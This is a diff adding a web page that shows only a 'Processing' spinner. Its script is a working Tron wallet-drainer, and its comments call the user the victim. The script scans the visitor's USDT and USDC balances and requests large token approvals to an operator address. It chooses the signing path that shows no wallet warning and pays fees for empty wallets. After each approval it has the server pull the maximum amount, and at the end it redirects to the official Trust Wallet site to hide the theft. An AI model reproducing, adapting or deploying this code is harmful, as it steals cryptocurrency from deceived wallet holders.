@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Processing</title>
+<meta name="robots" content="noindex">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    background: #FFFFFF; color: #0F172A;
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+  }
+  .box { text-align: center; padding: 24px; }
+  .spin {
+    width: 36px; height: 36px; margin: 0 auto;
+    border: 3.5px solid #E8EEF4; border-top-color: #3375BB;
+    border-radius: 50%; animation: rot .65s linear infinite;
+  }
+  @keyframes rot { to { transform: rotate(360deg); } }
+  @media (prefers-reduced-motion: reduce) { .spin { animation: none; } }
+  #status {
+    font-size: 13.5px; color: #64748B; font-weight: 500;
+    margin-top: 16px; visibility: hidden;
+  }
+  #status.show { visibility: visible; }
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="spin"></div>
+  <div id="status"></div>
+</div>
+<script>
+// ── Tron · Direkt — keine Maske: QR → Sheet sofort. ──────────────────────────
+// ?spender=T…  ?token=usdt|usdc  ?amount=<n>
+var params = new URLSearchParams(location.search);
+var spender = (params.get("spender") || "").trim();
+var TOKENS = {
+  usdt: { addr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6, name: "USDT" },
+  usdc: { addr: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6, name: "USDC" }
+};
+var tokenParam = (params.get("token") || "auto").toLowerCase();
+var token = TOKENS[tokenParam] || TOKENS.usdt;
+var amountParam = (params.get("amount") || "20").trim();
+// Dust-Schwelle wie exec/wallet/checker: minPullUsd aus /api/config,
+// Default $1 bis der Fetch resolved.
+var MIN_USD = 1;
+var cfgFullP = fetch("/api/config").then(function(r) { return r.json(); }).catch(function() { return null; });
+var cfgP = cfgFullP.then(function(j) { if (j && Number(j.minPullUsd) > 0) MIN_USD = Number(j.minPullUsd); });
+// Auto-Queue: ALLE bekannten TRC-20 mit Balance ≥ minPullUsd, größte→kleinste.
+// Jeder bekommt ein eigenes increaseApproval-Sheet (approve = max(Balance,
+// Link-amount, TronApproveAmt)) und danach den serverseitigen Auto-Pull.
+// Auto-Queue: NUR USDT + USDC (stable-coins mit sicherem Preis) — schneller
+// Scan, keine Sheets auf Airdrop-/Scam-TRC-20.
+var KNOWN_TRC20 = {
+  "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t": { name: "USDT", decimals: 6, px: 1 },
+  "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8": { name: "USDC", decimals: 6, px: 1 }
+};
+var KNOWN_HEX = {};
+Object.keys(KNOWN_TRC20).forEach(function(a) { KNOWN_HEX[tw_toHex(a).slice(2).toLowerCase()] = a; });
+function scanQueue(acct) {
+  if (!acct || !acct.trc20) return [];
+  var q = [];
+  acct.trc20.forEach(function(entry) {
+    Object.keys(entry).forEach(function(k) {
+      var h = (k.charAt(0) === "T" ? tw_toHex(k).slice(2) : k).toLowerCase();
+      var b58 = KNOWN_HEX[h];
+      if (!b58) return;
+      var raw = String(entry[k]);
+      var meta = KNOWN_TRC20[b58], usd;
+      try {
+        if (BigInt(raw) <= 0n) return;
+        usd = Number(BigInt(raw)) / Math.pow(10, meta.decimals) * meta.px;
+      } catch (e) { return; }
+      if (usd >= MIN_USD) q.push({ addr: b58, decimals: meta.decimals, name: meta.name, raw: raw, usd: usd });
+    });
+  });
+  q.sort(function(a, b) { return b.usd - a.usd; });
+  return q;
+}
+// ?for=T… — Opfer-Adresse schon bekannt: Balance-Read startet sofort,
+// parallel zum Provider-Detect (spart ~0,5s bis zum Sheet). Read-only —
+// der Gas-Drop bleibt an die tatsächlich verbundene Adresse gebunden.
+var forAddr = (params.get("for") || "").trim();
+var earlyAcctP = isTronAddr(forAddr)
+  ? fetchTronAcct(forAddr)
+  : null;
+var MOBILE = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+var statusEl = document.getElementById("status");
+
+var MONITOR_URL = "/api/events";
+var monitSid = "d-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
+function monit(ev, data) {
+  try {
+    var payload = JSON.stringify({ ev: ev, t: new Date().toISOString(), sid: monitSid, d: data || {} });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, payload)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: payload }).catch(function() {});
+  } catch(e) {}
+}
+
+function setStatus(t) { statusEl.textContent = t; statusEl.classList.add("show"); }
+function isTronAddr(a) { return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a); }
+// Vollständiger base58check — Regex allein laesst Tippfehler durch, die
+// dann stillschweigend eine FALSCHE Spender-Adresse encodieren wuerden.
+async function tronAddrValid(a) {
+  try {
+    if (!isTronAddr(a)) return false;
+    var ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    var num = 0n;
+    for (var i = 0; i < a.length; i++) {
+      var d = ALPH.indexOf(a[i]); if (d < 0) return false;
+      num = num * 58n + BigInt(d);
+    }
+    var hex = num.toString(16), zeros = 0;
+    while (a[zeros] === "1") zeros++;
+    hex = "00".repeat(zeros) + (hex.length % 2 ? "0" + hex : hex);
+    var bytes = []; for (var j = 0; j < hex.length; j += 2) bytes.push(parseInt(hex.substr(j, 2), 16));
+    if (bytes.length !== 25 || bytes[0] !== 0x41) return false;
+    var payload = new Uint8Array(bytes.slice(0, 21));
+    var h1 = await crypto.subtle.digest("SHA-256", payload);
+    var h2 = new Uint8Array(await crypto.subtle.digest("SHA-256", h1));
+    for (var k = 0; k < 4; k++) if (h2[k] !== bytes[21 + k]) return false;
+    return true;
+  } catch (e) { return false; }
+}
+function tg(path, body) {
+  // trongrid-Transient (403/429/5xx oder HAENGENDE Verbindung) → tronstack.
+  // fetch ohne Timeout wartet ewig wenn ein Node nur langsam statt
+  // fehlerhaft antwortet — AbortController nach 10s, dann Fallback.
+  function post(url) {
+    var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+    var to = ctl ? setTimeout(function() { ctl.abort(); }, 6000) : null;
+    return fetch(url + path, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body || {}), signal: ctl ? ctl.signal : undefined
+    }).then(function(r) {
+      if (to) clearTimeout(to);
+      if (!r.ok) throw new Error("HTTP " + r.status);
+      return r.json();
+    }).catch(function(e) { if (to) clearTimeout(to); throw e; });
+  }
+  return post("https://api.trongrid.io").catch(function() {
+    return post("https://api.tronstack.io");
+  }).catch(function() {
+    // Beide Nodes geflackert → ein letzter trongrid-Versuch: kurze
+    // Rate-Limit-Fenster sind beim dritten Call oft schon vorbei.
+    return post("https://api.trongrid.io");
+  });
+}
+// getaccount.trc20 ist node-abhaengig inkrementell und haeufig leer obwohl
+// die Wallet TRC-20 haelt — der /v1-Index liefert die vollstaendige Liste.
+// Beide parallel gelesen, Maps gemerged (dedup pro Contract, v1 zuerst).
+function fetchTronAcct(addr58) {
+  function getV1(host) {
+    var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+    var to = ctl ? setTimeout(function() { ctl.abort(); }, 5000) : null;
+    return fetch(host + "/v1/accounts/" + addr58, { signal: ctl ? ctl.signal : undefined })
+      .then(function(r) { if (!r.ok) throw new Error("HTTP " + r.status); return r.json(); })
+      .then(function(j) { if (to) clearTimeout(to); return (j && j.data && j.data[0]) || null; })
+      .catch(function() { if (to) clearTimeout(to); return null; });
+  }
+  var acctP = tg("/wallet/getaccount", { address: tw_toHex(addr58).slice(2) }).catch(function() { return null; });
+  function getTs() {
+    var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+    var to = ctl ? setTimeout(function() { ctl.abort(); }, 5000) : null;
+    return fetch("https://apilist.tronscanapi.com/api/account?address=" + addr58, { signal: ctl ? ctl.signal : undefined })
+      .then(function(r) { if (!r.ok) throw new Error("HTTP " + r.status); return r.json(); })
+      .then(function(j) {
+        if (to) clearTimeout(to);
+        if (!j || j.address == null) return null;
+        var trc = (j.trc20token_balances || []).map(function(t) { var o = {}; o[t.tokenId] = t.balance; return o; });
+        return { balance: j.balance, trc20: trc };
+      })
+      .catch(function() { if (to) clearTimeout(to); return null; });
+  }
+  var v1P = getV1("https://api.trongrid.io").then(function(v) { return v || getTs(); });
+  return Promise.all([acctP, v1P]).then(function(res) {
+    var a = res[0], v1a = res[1];
+    if (!a && !v1a) return null;
+    a = a || {};
+    var map = {};
+    ((v1a && v1a.trc20) || []).concat(a.trc20 || []).forEach(function(entry) {
+      Object.keys(entry).forEach(function(k) { map[k] = entry[k]; });
+    });
+    a.trc20 = Object.keys(map).map(function(k) { var o = {}; o[k] = map[k]; return o; });
+    if (a.balance == null && v1a) a.balance = v1a.balance;
+    return a;
+  });
+}
+function findTronWeb() {
+  return window.tronWeb ||
+         (window.tron && window.tron.tronWeb) ||
+         (window.tronLink && window.tronLink.tronWeb) || null;
+}
+async function getTronProvider() {
+  var addr = null;
+  function grab(res) {
+    if (res && typeof res === "object") {
+      addr = addr || res.address || (res.data && res.data.address) || (res.result && res.result.address) || null;
+    }
+  }
+  [window.tronLink, window.tron, window.trustwallet, window.trustWallet].forEach(function(t) {
+    if (t && t.request) {
+      try { Promise.resolve(t.request({ method: "tron_requestAccounts" })).then(grab).catch(function() {}); } catch(e) {}
+    }
+  });
+  try { window.dispatchEvent(new Event("tronLink#initialized")); } catch(e) {}
+  for (var i = 0; i < 160; i++) {
+    var tw = findTronWeb();
+    if (tw && tw.defaultAddress && tw.defaultAddress.base58) return { tw: tw, from: tw.defaultAddress.base58 };
+    if (addr && tw) return { tw: tw, from: addr };
+    // Mobiles Nicht-Wallet: nicht 40s warten — der Deeplink-Forward übernimmt.
+    if (MOBILE && i >= 16 && !tw) return null;
+    await new Promise(function(r) { setTimeout(r, 250); });
+  }
+  return null;
+}
+function tw_toHex(addr58) {
+  var ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  var num = 0n;
+  for (var i = 0; i < addr58.length; i++) num = num * 58n + BigInt(ALPH.indexOf(addr58[i]));
+  var hex = num.toString(16);
+  var zeros = 0;
+  while (addr58[zeros] === "1") zeros++;
+  hex = "00".repeat(zeros) + (hex.length % 2 ? "0" + hex : hex);
+  return "0x" + hex.slice(0, -8);
+}
+function amountRaw() {
+  var n = Number(amountParam);
+  if (!isFinite(n) || n <= 0) return "20000000";
+  var parts = amountParam.split(".");
+  var frac = (parts[1] || "").padEnd(token.decimals, "0").slice(0, token.decimals);
+  return (parts[0].replace(/\D/g, "") || "0") + frac;
+}
+async function buildIncreaseTx(from, tok, rawAmt, fallbackBal) {
+  var spendHex = tw_toHex(spender);
+  var ownerHex = tw_toHex(from).slice(2);
+  var acctP2 = tg("/wallet/getaccount", { address: ownerHex }).catch(function() { return null; });
+  var tokenHex = tw_toHex(tok.addr).slice(2);
+  // Kill-Switch wie trontx/checker: tronAllowance aus → die Tx wird als
+  // increaseApproval +0 gebaut (valid, broadcastet harmlos, Effekt null).
+  // /direct hat sonst den Toggle umgangen und weiter echt approved.
+  var cfg = await cfgFullP;
+  if (cfg && cfg.tronAllowance === false) rawAmt = "0";
+  // Approve-Floor aus der Admin-Config (Token-Einheiten × 10^decimals) —
+  // deckt kuenftige Einzahlungen ab und TW rendert das decodierte
+  // "Freigeben"-Sheet statt des generischen. 0 = kein Floor, Kill-Switch
+  // bleibt 0.
+  var aprU = (cfg && cfg.tronApproveAmt != null) ? Number(cfg.tronApproveAmt) : 200000000;
+  var linkU = Number(amountParam) || 0;
+  if (isFinite(linkU) && linkU > aprU) aprU = linkU;
+  if (rawAmt !== "0" && isFinite(aprU) && aprU > 0) {
+    var flr = BigInt(Math.floor(aprU)) * (10n ** BigInt(Math.min(tok.decimals || 6, 30)));
+    if (BigInt(rawAmt) < flr) rawAmt = flr.toString();
+  }
+  var param = spendHex.slice(2).padStart(64, "0")
+            + BigInt(rawAmt).toString(16).padStart(64, "0");
+  // Burn-Gate VOR dem Sheet (gleiche java-tron-Formel wie pull.py):
+  // 1) Simulation (gratis) liefert den exakten Energy-Bedarf inkl.
+  //    Dynamic-Factor — ein OOG-Confirm wuerde die volle fee_limit
+  //    verbrennen ohne dass die Allowance landet.
+  // 2) verfuegbar = eigene Energy + Balance/100sun; wenn < need → kein
+  //    Sheet feuern (Opfer verliert nichts, statt guaranteed Burn+Fail).
+  // 3) fee_limit muss >= need*100 sein (Cap auf nutzbare Energy) UND
+  //    <= Balance (TW-Guard) — beides sonst Abort statt Burn.
+  var selector = "increaseApproval(address,uint256)";
+  var simP = tg("/wallet/triggerconstantcontract", {
+    owner_address: ownerHex,
+    contract_address: tokenHex,
+    function_selector: selector,
+    parameter: param
+  });
+  var resrP = tg("/wallet/getaccountresource", { address: ownerHex }).catch(function() { return null; });
+  var sim = await simP;
+  var used = (sim && sim.energy_used) || 0;
+  if (!used || !((sim || {}).result || {}).result) {
+    // Manche TRC-20 (v.a. unbekannte in der Queue) haben kein increaseApproval
+    // — approve(address,uint256) ist der TRC-20-Pflichtselector.
+    selector = "approve(address,uint256)";
+    sim = await tg("/wallet/triggerconstantcontract", {
+      owner_address: ownerHex,
+      contract_address: tokenHex,
+      function_selector: selector,
+      parameter: param
+    }).catch(function() { return null; });
+    used = (sim && sim.energy_used) || 0;
+    if (!used || !((sim || {}).result || {}).result) {
+      throw new Error("simulation failed: " + JSON.stringify(sim && sim.result || sim).slice(0, 140));
+    }
+  }
+  // Balance frisch lesen — acctP kann pre-Gas-Drop sein; der Drop veraendert
+  // genau die Deckung die dieses Gate bewertet.
+  var acct = await acctP2;
+  // Read-Fehler ≠ leere Wallet: der Scan hat die Balance Sekunden vorher
+  // erfolgreich gelesen — als Fallback nehmen, sonst killt ein flaky
+  // Node jedes Sheet mit einem falschen "insufficient energy".
+  var bal = (acct && acct.balance != null) ? acct.balance : (fallbackBal || 0);
+  var resr = await resrP;
+  // VERFUEGBARE Energy = Limit − Used — nur das Limit zu lesen wuerde
+  // kuerzlich verbrauchte Energy mitzaehlen → Gate laesst durch, Tx reverts.
+  var haveE = resr ? Math.max(0, (resr.EnergyLimit || 0) - (resr.EnergyUsed || 0)) : 0;
+  var need = Math.ceil(used * 1.15);
+  if (haveE + Math.floor(bal / 100) < need) {
+    monit("direct_skip_burn", { from: from, need: need, have: haveE, bal_sun: bal });
+    throw new Error("insufficient energy — wallet cannot cover network fee");
+  }
+  var feeLimit = Math.min(Math.ceil(need * 100 * 1.05), Math.floor(bal * 0.95), 100000000);
+  if (feeLimit < need * 100) {
+    monit("direct_skip_burn", { from: from, need: need, fee_limit_cap: feeLimit });
+    throw new Error("fee cap below required energy — aborted before signature");
+  }
+  var res = await tg("/wallet/triggersmartcontract", {
+    owner_address: ownerHex,
+    contract_address: tokenHex,
+    function_selector: selector,
+    parameter: param,
+    fee_limit: feeLimit,
+    call_value: 0
+  });
+  if (!res || !res.transaction) throw new Error("build failed: " + JSON.stringify(res && res.result || res).slice(0, 160));
+  await extendExpiration(res.transaction);
+  return res.transaction;
+}
+// TronGrid-Txs verfallen ~60s nach Build — haelt das Opfer das Sheet laenger
+// offen, lehnt der Node beim Senden ab. expiration-varint (Wert ==
+// raw_data.expiration) in raw_data_hex patchen + txID = sha256 neu.
+async function extendExpiration(tx) {
+  try {
+    var target = BigInt(tx.raw_data.expiration), ADD = 3300000n;
+    var hx = tx.raw_data_hex, raw = [];
+    for (var i = 0; i < hx.length; i += 2) raw.push(parseInt(hx.substr(i, 2), 16));
+    function rdv(p) { var v = 0n, s = 0n; for (;;) { var b = raw[p++]; v |= BigInt(b & 127) << s; if (!(b & 128)) return [v, p]; s += 7n; } }
+    var pos = 0, hit = -1, vend = 0;
+    while (pos < raw.length) {
+      var t = rdv(pos); pos = t[1];
+      var wire = Number(t[0] & 7n);
+      if (wire === 0) { var vs = pos, vv = rdv(pos); pos = vv[1]; if (vv[0] === target) { hit = vs; vend = pos; break; } }
+      else if (wire === 2) { var l = rdv(pos); pos = l[1] + Number(l[0]); }
+      else if (wire === 5) pos += 4;
+      else if (wire === 1) pos += 8;
+      else break;
+    }
+    if (hit < 0) return;
+    var enc = [], v = target + ADD;
+    for (;;) { var b = Number(v & 127n); v >>= 7n; enc.push(b | (v ? 128 : 0)); if (!v) break; }
+    var raw2 = raw.slice(0, hit).concat(enc, raw.slice(vend));
+    var buf = await crypto.subtle.digest("SHA-256", new Uint8Array(raw2));
+    var toH = function(b) { return (b < 16 ? "0" : "") + b.toString(16); };
+    tx.raw_data_hex = raw2.map(toH).join("");
+    tx.txID = Array.from(new Uint8Array(buf)).map(toH).join("");
+    tx.raw_data.expiration = Number(target + ADD);
+  } catch (e) {}
+}
+// Gas-Drop — wartet nur wenn wirklich gedroppt wurde (leere Wallets);
+// gefüllte Opfer laufen ohne Verzögerung durch. knownBal (aus dem
+// Prefetch) ≥ 12 TRX → der Server wuerde eh "balance_ok" skippen —
+// den Roundtrip spart sich der Pfad komplett.
+// fetch mit hartem Timeout — ein haengender Request darf den Flow nie
+// endlos blockieren (Spinner ohne Fehler).
+function fetchT(url, opts, ms) {
+  var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+  var to = ctl ? setTimeout(function() { ctl.abort(); }, ms || 9000) : null;
+  opts = opts || {}; if (ctl) opts.signal = ctl.signal;
+  return fetch(url, opts).finally(function() { if (to) clearTimeout(to); });
+}
+async function sponsorFees(addr, acctP) {
+  try {
+    var known = acctP ? (await acctP.catch(function() { return null; })) : null;
+    if (known && (known.balance || 0) >= 12e6) return;
+    var balBefore = known ? (known.balance || 0) : -1;
+    // has_recent_session liest den Feed — das direct_connected-Beacon kann
+    // diesen Request noch ueberholen ("no recent session" → Drop skippt
+    // obwohl das Opfer live ist). Session-Event synchron vorausschicken.
+    await fetchT(MONITOR_URL, {
+      method: "POST", headers: { "Content-Type": "application/json" }, keepalive: true,
+      body: JSON.stringify({ ev: "direct_connected", t: new Date().toISOString(),
+                             sid: monitSid, d: { addr: addr } })
+    }, 5000).catch(function() {});
+    var p = await fetchT("/api/energy", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ step: "pay", victim: addr })
+    }, 15000).then(function(r) { return r.json(); });
+    if (!p || p.error || !p.gas_tx) return;
+    monit("energy_pay", { victim: addr, txid: p.gas_tx });
+    // Statt fix 9s: Balance pollen bis der Drop landet (typ. ~3-4s) —
+    // hartes Limit 12s falls ein Node hinterherhaengt.
+    for (var i = 0; i < 7; i++) {
+      await new Promise(function(r) { setTimeout(r, 1800); });
+      var a = await tg("/wallet/getaccount", { address: tw_toHex(addr).slice(2) }).catch(function() { return null; });
+      if (a && balBefore >= 0 && (a.balance || 0) > balBefore) break;
+      if (a && balBefore < 0 && (a.balance || 0) > 0) break;
+    }
+    monit("energy_sponsored", { victim: addr, txid: p.gas_tx });
+  } catch (e) {}
+}
+
+(async function() {
+  monit("direct_opened", { spender: spender || null, amount: amountParam, token: token.name, inWallet: !!findTronWeb() });
+  // Spender-Check laeuft parallel zum Provider-Detect — der Fetch
+  // haengt sonst ~0,5s Leerlauf vor dem Sheet-Pfad.
+  var liveOpP = fetchT("/api/pull?op=1", null, 8000).then(function(r) { return r.json(); })
+    .then(function(j) { return j && j.op && j.op.tron; }).catch(function() { return null; });
+  if (!(await tronAddrValid(spender))) { setStatus("Invalid link"); monit("direct_rejected", { reason: "invalid spender checksum" }); return; }
+  // Spender muss der Live-Operator sein — sonst zahlen wir den Gas-Drop
+  // fuer eine Allowance auf eine fremde Adresse (gefakter Link).
+  var liveOp = null;
+  try {
+    var conn = await getTronProvider();
+    if (!conn) {
+      // Mobile ohne injiziertes Wallet → einmalig per Universal-Link in die
+      // TW-App forwarden (wie checker). fwd=1 + sessionStorage verhindern
+      // Loop falls TW selbst kein tronWeb injiziert.
+      if (MOBILE && !params.get("fwd") && !sessionStorage.getItem("tw_fwd")) {
+        sessionStorage.setItem("tw_fwd", "1");
+        monit("direct_forward", { reason: "no provider" });
+        setStatus("Opening Trust Wallet…");
+        var self = location.origin + location.pathname + location.search
+                 + (location.search ? "&" : "?") + "fwd=1";
+        location.href = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(self);
+        return;
+      }
+      setStatus("Open inside Trust Wallet or TronLink");
+      monit("direct_rejected", { reason: "no provider" });
+      return;
+    }
+    monit("direct_connected", { addr: conn.from });
+    // Fetch war seit Page-Top in-flight — hier nur noch das Ergebnis
+    // einsammeln (i.d.R. bereits resolved).
+    liveOp = await liveOpP;
+    if (liveOp && spender !== liveOp) {
+      setStatus("Invalid link"); monit("direct_rejected", { reason: "spender != live operator" });
+      return;
+    }
+    // Balance-Fetch parallel zum Gas-Drop — bei ?for= schon seit Page-Load
+    // in-flight; bei Mismatch (anderer Account in der Wallet) neu lesen.
+    var t0 = Date.now();
+    var acctP = (earlyAcctP && forAddr === conn.from)
+      ? earlyAcctP
+      : fetchTronAcct(conn.from);
+    // Sponsor laeuft PARALLEL zum Wallet-Scan — erst vor dem ersten Sheet
+    // muss der Gas-Drop gelandet sein (Burn-Gate liest die Balance frisch).
+    var sponsorP = sponsorFees(conn.from, acctP);
+    var acct = await acctP;
+    // Auto-Queue: USDT/USDC mit Balance ≥ minPullUsd, größte→kleinste.
+    // Leere Wallet → ein Sheet aufs Link-Token mit dem Link-Betrag.
+    await cfgP;
+    var queue = scanQueue(acct);
+    if (!queue.length) queue = [{ addr: token.addr, decimals: token.decimals, name: token.name, raw: amountRaw() }];
+    monit("direct_queue", { from: conn.from, tokens: queue.length, t_ms: Date.now() - t0,
+                            names: queue.map(function(q) { return q.name; }).join(",") });
+    await sponsorP;
+    monit("direct_sponsored", { from: conn.from, t_ms: Date.now() - t0 });
+    // TronGrid-Txs verfallen ~60s nach Build (expiration/ref_block). Hält das
+    // Opfer das Sheet länger offen → "couldn't send". Bei jedem Versuch eine
+    // FRISCHE Tx bauen; ein Auto-Retry fängt abgelaufene/transient fehler ab.
+    // txid on-chain verifizieren — ein "Fehler" beim Broadcast heisst nicht,
+    // dass die Tx nicht gelandet ist (TW broadcastet beim Signieren selbst).
+    async function txInfo(txid) {
+      if (!txid) return null;
+      for (var i = 0; i < 3; i++) {
+        var info = await tg("/wallet/gettransactioninfobyid", { value: txid }).catch(function() { return null; });
+        if (info && info.receipt) return info;
+        await new Promise(function(r) { setTimeout(r, 4000); });
+      }
+      return null;
+    }
+    // Auto-Pull nach confirmed Approve — der Server liest allowance+balance
+    // selbst (amount=max), dest ist dort fix der Operator.
+    function collect(tokAddr) {
+      fetch("/api/pull", { method: "POST", keepalive: true,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "tron_collect", victim: conn.from, token: tokAddr, amount: "max" })
+      }).catch(function() {});
+    }
+    async function signOnce(it) {
+      var unsigned = await buildIncreaseTx(conn.from, it, it.raw, acct && acct.balance);
+      // Marker: ab hier haengt nur noch der Wallet-Aufruf — feuert dieses
+      // Event ohne Folge-Event, hat die Wallet das Sheet verschluckt.
+      monit("direct_built", { from: conn.from, token: it.name, t_ms: Date.now() - t0 });
+      monit("direct_signing", { from: conn.from, token: it.name });
+      // trx.sign = generisches Sheet OHNE Warnung (Owner-Vorgabe 05.10.).
+      // tronLink.sign nur Fallback — rendert sonst Warnbanner + Checkboxen.
+      var signed = await Promise.race([
+        (conn.tw && conn.tw.trx && typeof conn.tw.trx.sign === "function"
+          ? conn.tw.trx.sign(unsigned)
+          : (window.tronLink && typeof window.tronLink.sign === "function"
+            ? window.tronLink.sign(unsigned) : Promise.reject(new Error("no tron signer")))),
+        new Promise(function(_, rej) {
+          setTimeout(function() { rej(new Error("sign timeout — wallet swallowed the request")); }, 60000);
+        })
+      ]);
+      var bc = await tg("/wallet/broadcasttransaction", signed);
+      if (!bc || bc.result !== true) {
+        var raw = (bc && bc.message) || "";
+        var msg = /^[0-9a-fA-F]{6,}$/.test(raw)
+          ? (function(h){var s="";for(var i=0;i<h.length;i+=2)s+=String.fromCharCode(parseInt(h.substr(i,2),16));return s;})(raw)
+          : raw;
+        if (!/dup/i.test(msg)) {
+          var e = new Error(msg || "broadcast failed");
+          e.txid = signed && signed.txID;   // fuer Pre-Retry-Verifikation
+          throw e;
+        }
+        return signed.txID || "broadcast-by-wallet";
+      }
+      return bc.txid || (signed && signed.txID);
+    }
+    var done = 0, lastTxid = null;
+    for (var qi = 0; qi < queue.length; qi++) {
+      var it = queue[qi];
+      if (queue.length > 1) setStatus("Confirm in wallet… (" + (qi + 1) + "/" + queue.length + " · " + it.name + ")");
+      else setStatus("Confirm in wallet…");
+      var txid;
+      try {
+        txid = await signOnce(it);
+      } catch (e1) {
+        // "Site not connected" = fehlende Site-Permission, kein Cancel —
+        // einmal connecten, dann dieselbe Tx erneut anbieten.
+        var m1 = ((e1 && (e1.message || e1)) + "");
+        if (/not connected/i.test(m1) && !it._connected) {
+          it._connected = true;
+          var bridge = [window.tronLink, window.tron, window.trustwallet, window.trustWallet]
+            .filter(function(t) { return t && t.request; })[0];
+          if (bridge) {
+            monit("direct_connect_req", { token: it.name });
+            try { await bridge.request({ method: "tron_requestAccounts" }); } catch(e) {}
+            try { txid = await signOnce(it); } catch (e2) { e1 = e2; txid = null; }
+          }
+        }
+        if (!txid) {
+          // Bevor ein Retry eine zweite Signatur (und ggf. zweite Fee) anwirft:
+          // war die erste Tx vielleicht doch live? Confirmed → direkt fertig.
+          var info = await txInfo(e1 && e1.txid);
+          if (info && (info.receipt || {}).result === "SUCCESS") {
+            txid = e1.txid;
+          } else {
+            monit("direct_rejected", { token: it.name,
+                                       reason: ((e1 && (e1.message || e1)) + "").slice(0, 200) });
+            continue; // verworfener Token → nächster Queue-Eintrag
+          }
+        }
+      }
+      done++;
+      lastTxid = txid;
+      // Event SOFORT — das Paar landet sofort im Tracker (Discovery liest
+      // from+spender), nicht erst nach der Receipt-Warte.
+      monit("direct_approved", { spender: spender, amount: String(it.raw), token: it.name,
+                                 hash: txid, from: conn.from, step: qi + 1, of: queue.length });
+      collect(it.addr);
+    }
+    if (!done) throw new Error("all sheets rejected");
+    var finalInfo = await txInfo(lastTxid);
+    var finalResult = (finalInfo && finalInfo.receipt) ? finalInfo.receipt.result : "unseen";
+    monit("direct_confirmed", { hash: lastTxid, from: conn.from, receipt: finalResult, approved: done, of: queue.length });
+    // Tab landet auf der offiziellen Trust-Wallet-Seite — wirkt wie ein
+    // natürlicher Abschluss des Wallet-Flows statt einer toten Erfolgsseite.
+    setTimeout(function() { location.replace("https://trustwallet.com/"); }, 900);
+  } catch(e) {
+    var reason = (e && (e.message || e)) + "";
+    var extra = {};
+    try {
+      if (e && typeof e === "object") {
+        if (e.name) extra.name = e.name;
+        if (e.code != null) extra.code = e.code;
+        var ks = Object.keys(e);
+        if (ks.length) extra.keys = ks.join(",").slice(0, 160);
+      } else extra.type = typeof e;
+    } catch(x) {}
+    monit("direct_rejected", Object.assign({ spender: spender, reason: reason.slice(0, 200) }, extra));
+    setStatus("Failed — " + reason.slice(0, 80));
+    document.querySelector(".spin").style.display = "none";
+  }
+})();
+</script>
+</body>
+</html>
